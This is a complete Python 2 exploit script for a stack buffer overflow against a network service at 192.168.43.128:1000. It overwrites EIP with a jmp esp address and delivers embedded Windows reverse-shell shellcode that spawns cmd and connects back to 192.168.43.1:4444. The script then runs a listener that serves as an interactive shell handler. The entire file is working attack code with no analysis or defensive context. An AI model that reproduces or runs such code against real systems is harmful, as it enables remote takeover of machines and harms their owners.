#!/usr/bin/env python
from socket import *
from struct import *
from time import *
import sys

def L32(val): return pack('<I',val)

def ip_value(ip_str):
	ret = 0x00000000
	str_list = ip_str.split('.')
	for i in xrange(len(str_list)):
		ret += int(str_list[i])<<(3-i)*8
	return ret

def exploit(ip,port,data):
	sockfd = socket(AF_INET,SOCK_STREAM)
	sockfd.connect((ip,port))
	sockfd.send(data+'\x0a')
	#sockfd.recv(1)
	sockfd.close()

def recv_until(sockfd,mark=''):
	ret = ''
	while True:
		buf = sockfd.recv(4096)
		ret += buf
		if mark in buf :
			break
	return ret


def bind_local(ip,port):
	servsockfd = socket(AF_INET , SOCK_STREAM)
	servsockfd.bind((ip,port))
	servsockfd.listen(10)
	print "listen on %s:%s" % (ip,port)
	clisockfd,client_addr = servsockfd.accept()
	print "connected from remote host %s:%s" % client_addr
	sys.stdout.write(recv_until(clisockfd,mark='>'))
	while True:
		data = raw_input()
		if data in ['exit','q','quit']:
			break
		clisockfd.send(data+'\n')
		sys.stdout.write(recv_until(clisockfd,mark='>'))
	clisockfd.close()
	servsockfd.close()
	return 


########################################################################################################


TARGET_IP = '192.168.43.128'
TARGET_PORT = 1000

############################################################
#				reverse shellcode
#				
#		notice: change 192.168.43.1 with your ip
############################################################
REVERSE_IP   = '192.168.43.1'
REVERSE_PORT = 4444
REVERSE_SHELLCODE = \
"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +\
"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +\
"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +\
"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +\
"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +\
"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +\
"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +\
"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +\
"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +\
"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07" +\
"\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00" +\
"\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF" +\
"\xD5\x89\xC7\x68" +\
pack('>L',ip_value(REVERSE_IP)) +\
"\x68\x02\x00" +\
pack('>H',REVERSE_PORT) +\
"\x89\xE6\x6A" +\
"\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89" +\
"\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24" +\
"\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46" +\
"\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x4E" +\
"\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xE0\x1D\x2A\x0A" +\
"\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05" +\
"\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5"



if __name__ == '__main__':
	JUNK = L32(0x90909090)
	EIP  = L32(0x7ffa4512)					#jmp_esp = 0x7ffa4512
	data = 'a' * 64 + JUNK + EIP + JUNK + REVERSE_SHELLCODE
	print '\n\n[*] begin to exploit.....'
	exploit(TARGET_IP, TARGET_PORT, data)
	bind_local(REVERSE_IP,REVERSE_PORT)
	print '\n\n[*] finished!......'
